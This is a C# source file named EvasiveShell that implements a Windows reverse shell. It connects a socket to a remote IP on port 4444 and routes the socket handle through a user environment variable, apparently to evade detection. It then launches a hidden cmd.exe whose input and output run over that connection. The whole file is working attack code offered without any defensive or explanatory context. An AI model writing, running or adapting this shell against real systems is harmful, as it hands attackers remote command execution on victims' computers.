namespace EvasiveShell
{
  using System.Net.Sockets;
  using System.Runtime.InteropServices;
  using Win32Imports;

  public class Program : DllImportsBase
  {
    public static void Main(string[] args)
    {
      Helpers.InitializeWSA();
      var ip = Helpers.GetIP();

      var sockAddrIn = new sockaddr_in();
      sockAddrIn.sin_family = 2;
      sockAddrIn.sin_port = htons(4444);
      Helpers.PrintLastError(nameof(htons));

      sockAddrIn.sin_addr.S_addr = inet_addr(ip);
      Helpers.PrintLastError(nameof(inet_addr));

      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);

      var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);

      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
      Helpers.PrintLastError(nameof(WSASocketA));
      string socketToString = "";
      var intRepresentationSocket = socket.ToInt64();
      
      Environment.SetEnvironmentVariable("TESTTESTTEST", intRepresentationSocket.ToString(), EnvironmentVariableTarget.User);
      var serialized = Environment.GetEnvironmentVariable("TESTTESTTEST", EnvironmentVariableTarget.User);
      var testPtr = new IntPtr(long.Parse(serialized));
      socket = IntPtr.Zero;
      socket = testPtr;

      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
      Marshal.StructureToPtr(sockAddr, addrPointer, false);
      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
      Helpers.PrintLastError(nameof(connect));

      var socketHandle = new SafeSocketHandle(socket, false);
      STARTUPINFO startupInfo = new STARTUPINFO();
      Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
      startupInfo.cb = Marshal.SizeOf(startupInfo);
      startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
      startupInfo.hStdInput = socketHandle.DangerousGetHandle();
      startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
      startupInfo.hStdError = socketHandle.DangerousGetHandle();
      PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
      CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
      Helpers.PrintLastError(nameof(CreateProcessA));
    }
  }
}